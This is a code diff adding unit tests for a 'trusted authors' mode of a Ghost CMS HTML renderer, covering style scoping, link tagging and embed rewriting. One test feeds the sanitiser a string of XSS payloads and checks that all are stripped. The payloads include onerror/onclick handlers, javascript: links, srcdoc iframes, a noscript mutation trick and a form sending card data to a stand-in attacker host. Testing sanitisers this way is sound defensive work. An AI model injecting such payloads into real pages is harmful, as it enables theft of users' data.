@@ -317,3 +317,65 @@ describe('GhostHtml — every Ghost card', () => {
       .toContain('srcSet="https://cms.example/a.jpg 600w, https://cms.example/b.jpg 1200w"');
   });
 });
+
+// 2026-10-14, Tina: "remove the whole allowlist for specific users". Trusted mode renders the
+// agency's HTML and CSS as written, and still removes anything that can run or submit.
+describe('GhostHtml — trusted authors', () => {
+  const one = (h: string) => {
+    process.env.GHOST_URL = 'https://cms.example';
+    return renderToStaticMarkup(<GhostHtml html={h} trusted />);
+  };
+
+  it('keeps their tags, classes and inline styles', () => {
+    const out = one('<div class="faq" style="border:1px solid #d9d9d9;padding:12px"><table class="t"><tr><td style="background:#f5f5f5">Cell</td></tr></table><custom-box data-x="1">Custom</custom-box></div>');
+    expect(out).toContain('class="faq"');
+    expect(out).toMatch(/style="border:1px solid #d9d9d9;padding:12px"/);
+    expect(out).toContain('style="background:#f5f5f5"');
+    expect(out).toContain('Custom');
+    expect(out.startsWith('<div class="ghost-raw">')).toBe(true);
+  });
+
+  it('scopes a pasted style block to the article and keeps child selectors intact', () => {
+    const out = one('<style>.faq > p { color: red }</style><p>x</p>');
+    expect(out).toContain('@scope (.ghost-raw)');
+    expect(out).toContain('.faq > p { color: red }');
+  });
+
+  it('still removes everything that can run or submit', () => {
+    const out = one(`<p onclick="steal()" onmouseover="steal()">a</p><script>steal()</script>
+<img src="https://cms.example/a.jpg" onerror="steal()"><a href="javascript:steal()">j</a><a href="data:text/html,x">d</a>
+<form action="https://evil.example"><input name="card"><button>Pay</button></form><base href="https://evil.example/">
+<meta http-equiv="refresh" content="0;url=https://evil.example"><iframe srcdoc="<script>steal()</script>"></iframe>
+<iframe src="https://evil.example"></iframe><object data="x.swf"></object><svg><script>steal()</script><a xlink:href="javascript:steal()">s</a></svg>
+<math><mi xlink:href="javascript:steal()">m</mi></math><noscript><p title="</noscript><img src=x onerror=steal()>"></noscript>`);
+    for (const bad of ['steal', 'javascript:', 'data:text', '<form', '<input', '<base', '<meta', 'srcdoc', 'evil.example', '<object', '<script']) {
+      expect(out).not.toContain(bad);
+    }
+  });
+
+  it('tags outbound links and keeps internal ones in the tab', () => {
+    const out = one('<a class="cta" href="https://brand.example/x" target="_self" rel="opener">Shop</a><a href="https://themodestyhouse.com/modest-abayas" target="_blank">Abayas</a>');
+    expect(out).toMatch(/<a class="cta" href="https:\/\/brand\.example\/x\?utm_[^"]*" target="_blank" rel="noopener noreferrer sponsored" data-surface="editorial">Shop<\/a>/);
+    expect(out).toContain('<a href="/modest-abayas">Abayas</a>');
+  });
+
+  it('cannot take the page\'s own ids', () => {
+    const out = one('<h2 id="newsletter">x</h2><input id="newsletter-email"><p id="faq-1">y</p>');
+    expect(out).not.toContain('id="newsletter"');
+    expect(out).toContain('id="faq-1"');
+  });
+
+  it('still renders Ghost cards through their own renderers', () => {
+    const out = one('<div class="kg-card kg-toggle-card"><div class="kg-toggle-heading"><h4 class="kg-toggle-heading-text">Q</h4><button class="kg-toggle-card-icon"><svg></svg></button></div><div class="kg-toggle-content"><p>A</p></div></div>');
+    expect(out).toContain('<details><summary>Q</summary><p>A</p></details>');
+  });
+
+  it('plays YouTube through the privacy-enhanced host', () => {
+    expect(one('<iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ" width="560"></iframe>')).toContain('src="https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ"');
+  });
+
+  it('is off unless the page asks for it', () => {
+    process.env.GHOST_URL = 'https://cms.example';
+    expect(renderToStaticMarkup(<GhostHtml html={'<p style="color:red" class="x">a</p>'} />)).toBe('<p>a</p>');
+  });
+});
